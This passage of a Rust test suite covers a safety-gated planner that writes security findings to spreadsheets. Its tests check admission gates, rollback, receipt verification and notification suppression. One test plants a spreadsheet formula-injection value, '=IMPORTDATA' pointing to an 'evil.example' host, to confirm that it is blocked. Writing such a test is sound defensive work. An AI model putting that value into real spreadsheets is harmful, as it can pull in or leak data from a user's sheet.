                "input": "sha256:1111111111111111111111111111111111111111111111111111111111111111",
                "target": target_fingerprint
            },
            "preconditions": {
                "mode": {"expected": "read-only", "observed": "read-only", "satisfied": true},
                "coverage": {"coverageComplete": true, "requiredCoverageComplete": true, "failClosed": false, "sources": [], "satisfied": true},
                "schema": {"expected": 7, "observed": 7, "compatible": true, "satisfied": true},
                "ids": {"inputUnique": true, "targetUnique": true, "exactKeyFields": {}, "inputCounts": {}, "targetCounts": {}, "satisfied": true},
                "capacity": {"limits": {}, "requestedRows": {}, "targetRows": {}, "requestedCells": {}, "satisfied": true},
                "snapshot": {"revision": "revision-7", "etag": "etag-7", "observedStateFingerprint": target_fingerprint, "satisfied": true},
                "authorizationRequired": true,
                "externalWritesAllowed": false
            },
            "migration": {
                "fromVersion": 6,
                "toVersion": 7,
                "status": "target_already_schema_7",
                "mode": "additive_only",
                "externalWritesAllowed": false,
                "additions": [{"tab": "Findings", "field": "sourceKind", "reason": "typed source"}],
                "preservedExistingFields": ["status", "notes", "links"],
                "invariants": ["append_only_columns", "existing_cells_are_not_reinterpreted", "existing_rows_are_not_deleted", "human_fields_are_preserved"],
                "forbiddenOperations": ["delete_columns", "delete_cells", "delete_rows", "reinterpret_existing_columns", "overwrite_human_fields"]
            },
            "sheets": {
                "phase": "sheet_mutations_before_notification",
                "externalWritesAllowed": false,
                "tabOrder": ["Findings", "Investigations", "Recommendations"],
                "operationOrder": ["create", "update", "noop", "suppress"],
                "tabs": [
                    {"name": "Findings", "keyField": "eventId", "range": "Findings!A:AB", "lookupRange": "Findings!A:AB", "operations": [findings]},
                    {"name": "Investigations", "keyField": "investigationId", "range": "Investigations!A:O", "lookupRange": "Investigations!A:O", "operations": [investigations]},
                    {"name": "Recommendations", "keyField": "recommendationId", "range": "Recommendations!A:M", "lookupRange": "Recommendations!A:M", "operations": [recommendations]}
                ]
            },
            "readback": {"phase": "required_after_sheet_mutations", "executed": false, "success": false, "assertions": assertions, "onFailure": "block_notification_and_restore_from_backup"},
            "rollback": {"strategy": "retain_target_snapshot_and_discard_local_bundle", "externalWritesPerformed": false, "targetFingerprint": target_fingerprint, "targetRevision": "revision-7", "steps": ["retain_original_target_snapshot", "future_authorized_writer_must_restore_backup_before_retry"]},
            "noEffect": {"sheetsWritesPerformed": false, "emailSent": false, "credentialsChanged": false, "targetMutated": false, "localBundleOnly": true, "rollbackAction": "discard_bundle_and_retain_target_snapshot"},
            "notification": {"phase": "after_readback", "action": "suppress", "effective": "suppress", "candidateAction": "emit", "eligible": false, "recipientPolicy": "unresolved", "recipients": [], "requiresReadbackSuccess": true, "authorizationRequired": true, "reason": "notification_requires_readback_success_and_human_authorization", "payload": {}},
            "notifier": {"phase": "after_readback", "action": "suppress", "effective": "suppress", "candidateAction": "emit", "eligible": false, "recipientPolicy": "unresolved", "recipients": [], "requiresReadbackSuccess": true, "authorizationRequired": true, "reason": "notification_requires_readback_success_and_human_authorization", "payload": {}}
        })
    }

    #[test]
    fn compiles_stable_offline_program_with_strict_order_and_no_effect_flags() {
        let first = super::compile_execution_program(&bundle(), &target(), &policy())
            .expect("T4 program should compile");
        let second = super::compile_execution_program(&bundle(), &target(), &policy())
            .expect("same inputs should compile");

        assert_eq!(first, second);
        assert_eq!(
            first["programVersion"],
            "security_intelligence_monitor_execution_program_v1"
        );
        assert_eq!(first["externalWritesAllowed"], false);
        assert_eq!(first["liveApplyAvailable"], false);
        assert_eq!(first["notification"]["effective"], "suppress");
        assert_eq!(first["humanAuthorizationRequired"], true);
        assert_eq!(first["policyId"], "writer-policy-2026-08");
        assert_eq!(first["policyLimits"]["maxOperations"], 100);
        assert_eq!(
            first["phases"]
                .as_array()
                .expect("phases")
                .iter()
                .map(|phase| phase["name"].as_str().unwrap())
                .collect::<Vec<_>>(),
            vec![
                "admit_preflight",
                "backup_snapshot_pinning",
                "additive_schema_migration",
                "findings_writes",
                "investigations_writes",
                "recommendations_writes",
                "exact_readback",
                "commit_or_rollback",
                "notification_handoff"
            ]
        );
        assert!(first["programFingerprint"]
            .as_str()
            .unwrap()
            .starts_with("sha256:"));
    }

    fn compiled_program() -> Value {
        super::compile_execution_program(&bundle(), &target(), &policy())
            .expect("fixture program should compile")
    }

    #[test]
    fn admits_only_explicit_valid_policy_and_matching_snapshot() {
        let mut empty_recipients = policy();
        empty_recipients["recipientPolicy"]["to"] = json!([]);
        let error = super::compile_execution_program(&bundle(), &target(), &empty_recipients)
            .expect_err("empty recipient policy must block admission")
            .to_string();
        assert!(error.contains("To/Bcc roles cannot be empty"));

        let mut placeholder = policy();
        placeholder["recipientPolicy"]["to"] = json!(["security-operations@example.com"]);
        let error = super::compile_execution_program(&bundle(), &target(), &placeholder)
            .expect_err("placeholder recipient must block admission")
            .to_string();
        assert!(error.contains("notification recipient"));

        let mut invented_bundle_recipient = bundle();
        invented_bundle_recipient["notification"]["recipientPolicy"] = json!("fixed");
        invented_bundle_recipient["notification"]["recipients"] =
            json!(["security-operations@wearenexa.com"]);
        let error =
            super::compile_execution_program(&invented_bundle_recipient, &target(), &policy())
                .expect_err("invented T3b recipient must remain unresolved")
                .to_string();
        assert!(error.contains("remain unresolved"));

        let mut invalid_identity = policy();
        invalid_identity["spreadsheetId"] = json!("sheet/with/path");
        let error = super::compile_execution_program(&bundle(), &target(), &invalid_identity)
            .expect_err("unsafe spreadsheet identity must block admission")
            .to_string();
        assert!(error.contains("spreadsheet identity"));

        let mut stale_revision = target();
        stale_revision["snapshot"]["revision"] = json!("revision-8");
        let error = super::compile_execution_program(&bundle(), &stale_revision, &policy())
            .expect_err("revision drift must block admission")
            .to_string();
        assert!(error.contains("revision or etag mismatch"));

        let mut missing_backup = target();
        missing_backup["snapshot"] = json!({});
        let error = super::compile_execution_program(&bundle(), &missing_backup, &policy())
            .expect_err("missing backup fingerprint must block admission")
            .to_string();
        assert!(error.contains("missing state fingerprint"));

        let mut top_level_guards = target();
        let snapshot = top_level_guards
            .get("snapshot")
            .cloned()
            .expect("snapshot metadata");
        top_level_guards["revision"] = snapshot["revision"].clone();
        top_level_guards["etag"] = snapshot["etag"].clone();
        top_level_guards["stateFingerprint"] = snapshot["stateFingerprint"].clone();
        top_level_guards
            .as_object_mut()
            .expect("target object")
            .remove("snapshot");
        super::compile_execution_program(&bundle(), &top_level_guards, &policy())
            .expect("T3b top-level snapshot guards should remain compatible");
    }

    #[test]
    fn rejects_ineligible_bundle_duplicate_or_unsafe_requests_and_partial_readback() {
        let mut blocked = bundle();
        blocked["status"] = json!("blocked");
        let error = super::compile_execution_program(&blocked, &target(), &policy())
            .expect_err("blocked bundle must not enter a writer program")
            .to_string();
        assert!(error.contains("not eligible"));

        let mut duplicate = bundle();
        let duplicate_operation = duplicate["sheets"]["tabs"][0]["operations"][0].clone();
        duplicate["sheets"]["tabs"][0]["operations"]
            .as_array_mut()
            .expect("operations")
            .push(duplicate_operation);
        let error = super::compile_execution_program(&duplicate, &target(), &policy())
            .expect_err("duplicate key must block admission")
            .to_string();
        assert!(error.contains("duplicate key"));

        let mut unsafe_value = bundle();
        unsafe_value["sheets"]["tabs"][0]["operations"][0]["record"]["machineValue"] =
            json!("=IMPORTDATA(\"https://evil.example\")");
        let error = super::compile_execution_program(&unsafe_value, &target(), &policy())
            .expect_err("formula injection must block admission")
            .to_string();
        assert!(error.contains("unsafe formula"));

        let mut unsafe_url = bundle();
        unsafe_url["sheets"]["tabs"][0]["operations"][0]["record"]["sourceLink"] =
            json!("https://evil.example/redirect");
        let error = super::compile_execution_program(&unsafe_url, &target(), &policy())
            .expect_err("non-allowlisted URL must block admission")
            .to_string();
        assert!(error.contains("non-allowlisted URL"));

        let mut human_patch = bundle();
        human_patch["sheets"]["tabs"][0]["operations"][0]["patch"]["notes"] = json!("overwrite");
        let error = super::compile_execution_program(&human_patch, &target(), &policy())
            .expect_err("human field patch must block admission")
            .to_string();
        assert!(error.contains("human field"));

        let mut partial_readback = bundle();
        partial_readback["readback"]["assertions"]
            .as_array_mut()
            .expect("assertions")
            .pop();
        let error = super::compile_execution_program(&partial_readback, &target(), &policy())
            .expect_err("partial readback must block admission")
            .to_string();
        assert!(error.contains("readback assertions"));

        let mut overlapping_ranges = bundle();
        overlapping_ranges["sheets"]["tabs"][1]["range"] = json!("Findings!A:AB");
        let error = super::compile_execution_program(&overlapping_ranges, &target(), &policy())
            .expect_err("overlapping ranges must block admission")
            .to_string();
        assert!(error.contains("range"));

        let mut ordering_drift = bundle();
        let mut second_operation = ordering_drift["sheets"]["tabs"][0]["operations"][0].clone();
        second_operation["action"] = json!("update");
        second_operation["key"] = json!("simv1-event-00000000-0000-0000-0000-000000000002");
        second_operation["lookup"]["key"] = second_operation["key"].clone();
        second_operation["record"]["eventId"] = second_operation["key"].clone();
        ordering_drift["sheets"]["tabs"][0]["operations"] = json!([
            second_operation,
            ordering_drift["sheets"]["tabs"][0]["operations"][0]
        ]);
        let error = super::compile_execution_program(&ordering_drift, &target(), &policy())
            .expect_err("operation ordering drift must block admission")
            .to_string();
        assert!(error.contains("ordering"));

        let mut schema_drift = bundle();
        schema_drift["preconditions"]["schema"]["observed"] = json!(6);
        let error = super::compile_execution_program(&schema_drift, &target(), &policy())
            .expect_err("schema drift must block admission")
            .to_string();
        assert!(error.contains("preflight gate"));

        let mut duplicate_role_recipient = policy();
        duplicate_role_recipient["recipientPolicy"]["bcc"] =
            json!(["workspace-security@wearenexa.com"]);
        let error =
            super::compile_execution_program(&bundle(), &target(), &duplicate_role_recipient)
                .expect_err("To/Bcc role overlap must block admission")
                .to_string();
        assert!(error.contains("duplicate notification recipient across roles"));
    }

    #[test]
    fn carries_exact_requests_revisions_and_preserved_fields_into_each_phase() {
        let program = compiled_program();
        let phases = program["phases"].as_array().expect("phases");
        assert_eq!(phases[0]["request"]["requestType"], "admit_preflight");
        assert_eq!(
            phases[1]["request"]["requestType"],
            "backup_snapshot_pinning"
        );
        assert_eq!(
            phases[1]["request"]["snapshotFingerprint"],
            program["target"]["stateFingerprint"]
        );
        assert_eq!(phases[1]["request"]["expectedRevision"], "revision-7");
        assert_eq!(
            phases[2]["request"]["requestType"],
            "additive_schema_migration"
        );
        assert_eq!(phases[2]["request"]["externalWritesAllowed"], false);
        assert_eq!(phases[3]["request"]["tab"], "Findings");
        assert_eq!(phases[4]["request"]["tab"], "Investigations");
        assert_eq!(phases[5]["request"]["tab"], "Recommendations");
        for phase in &phases[3..6] {
            let request = &phase["request"];
            assert_eq!(
                request["expectedTargetFingerprint"],
                program["target"]["stateFingerprint"]
            );
            assert_eq!(request["operations"][0]["externalWritePerformed"], false);
            assert_eq!(
                request["operations"][0]["key"],
                request["operations"][0]["record"][request["keyField"].as_str().unwrap()]
            );
        }
        assert_eq!(phases[6]["request"]["requestType"], "exact_readback");
        assert_eq!(
            phases[6]["request"]["assertions"].as_array().unwrap().len(),
            3
        );
        assert_eq!(
            phases[7]["request"]["onFailure"],
            "rollback_from_pinned_snapshot"
        );
        assert_eq!(phases[8]["request"]["requestType"], "notification_handoff");
        assert_eq!(phases[8]["request"]["effective"], "suppress");
        assert_eq!(
            program["notification"]["to"],
            json!(["workspace-security@wearenexa.com"])
        );
        assert_eq!(
            program["notification"]["bcc"],
            json!(["facundo.garat@wearenexa.com"])
        );
        assert_eq!(phases[8]["request"]["to"], program["notification"]["to"]);
        assert_eq!(phases[8]["request"]["bcc"], program["notification"]["bcc"]);
    }

    #[test]
    fn simulates_success_without_effect_and_hands_off_only_after_readback() {
        let program = compiled_program();
        let simulation = super::simulate_execution_program(&program, None)
            .expect("success simulation should compile");
        assert_eq!(simulation["status"], "completed");
        assert_eq!(simulation["externalWritesAllowed"], false);
        assert_eq!(simulation["liveApplyAvailable"], false);
        assert_eq!(simulation["notificationEffective"], "suppress");
        assert_eq!(simulation["notificationSent"], false);
        assert_eq!(simulation["receipts"].as_array().unwrap().len(), 9);
        assert_eq!(simulation["receipts"][6]["phase"], "exact_readback");
        assert_eq!(
            simulation["receipts"][6]["readbackAssertionsSucceeded"],
            true
        );
        assert_eq!(simulation["receipts"][8]["phase"], "notification_handoff");
        assert_eq!(simulation["receipts"][8]["status"], "suppressed");
        assert_eq!(
            simulation["invariants"]["noWriteBeforeAdmissionAndBackup"],
            true
        );
        assert_eq!(
            simulation["invariants"]["notificationOnlyAfterSuccessfulReadback"],
            true
        );
        super::verify_execution_receipts(&program, &simulation)
            .expect("generated receipts must verify");
    }

    #[test]
    fn every_phase_failure_rolls_back_and_suppresses_notification() {
        let program = compiled_program();
        for phase in super::FAILURE_PHASE_NAMES.iter().copied() {
            let simulation = super::simulate_execution_program(&program, Some(phase))
                .unwrap_or_else(|error| panic!("{phase} should simulate: {error}"));
            assert_ne!(simulation["status"], "completed", "failure phase {phase}");
            assert_eq!(simulation["notificationSent"], false);
            assert_eq!(simulation["notificationEffective"], "suppress");
            assert_eq!(
                simulation["receipts"].as_array().unwrap().last().unwrap()["phase"],
                "rollback"
            );
            assert_eq!(simulation["invariants"]["failureRoutesToRollback"], true);
            if phase == "rollback" {
                assert_eq!(simulation["status"], "blocked_rollback_failure");
            }
            super::verify_execution_receipts(&program, &simulation)
                .unwrap_or_else(|error| panic!("{phase} receipts should verify: {error}"));
        }
    }

    #[test]
    fn rejects_forged_or_out_of_order_receipts_and_handles_exact_replay() {
        let program = compiled_program();
        let simulation = super::simulate_execution_program(&program, None)
            .expect("success simulation should compile");
        let replay = super::replay_execution_program(&program, &simulation)
            .expect("exact completed replay should be a noop");
        assert_eq!(replay["action"], "noop");
        assert_eq!(replay["reason"], "exact_completed_replay");

        let mut forged = simulation.clone();
        forged["receipts"][0]["status"] = json!("failed");
        let error = super::verify_execution_receipts(&program, &forged)
            .expect_err("forged receipt must be rejected")
            .to_string();
        assert!(error.contains("forged receipt fingerprint"));

        let mut out_of_order = simulation.clone();
        let first = out_of_order["receipts"][0].clone();
        out_of_order["receipts"][0] = out_of_order["receipts"][1].clone();
        out_of_order["receipts"][1] = first;
        let error = super::verify_execution_receipts(&program, &out_of_order)
            .expect_err("out-of-order receipt must be rejected")
            .to_string();
        assert!(error.contains("out of order") || error.contains("chain"));

        let mut divergent_policy = policy();
        divergent_policy["policyId"] = json!("writer-policy-divergent");
        let divergent_program =
            super::compile_execution_program(&bundle(), &target(), &divergent_policy)
                .expect("policy-only divergence should still compile");
        let error = super::replay_execution_program(&divergent_program, &simulation)
            .expect_err("divergent fingerprint must not replay")
            .to_string();
        assert!(error.contains("fingerprint"));

        let failed = super::simulate_execution_program(&program, Some("findings_writes"))
            .expect("failed simulation should compile");
        let error = super::replay_execution_program(&program, &failed)
            .expect_err("incomplete replay must be ambiguous")
            .to_string();
        assert!(error.contains("completed simulation"));
    }

    #[test]
    fn compiles_empty_input_but_keeps_all_safety_gates() {
        let mut empty = bundle();
        for tab in empty["sheets"]["tabs"].as_array_mut().unwrap() {
            tab["operations"] = json!([]);
        }
        empty["readback"]["assertions"] = json!([]);
        let program = super::compile_execution_program(&empty, &target(), &policy())
            .expect("empty observer input should compile as a no-op program");
        assert!(program["phases"][3]["request"]["operations"]
            .as_array()
            .unwrap()
            .is_empty());
        let simulation = super::simulate_execution_program(&program, None)
            .expect("empty program simulation should succeed");
        assert_eq!(simulation["status"], "completed");
        assert_eq!(simulation["notificationSent"], false);
    }
}
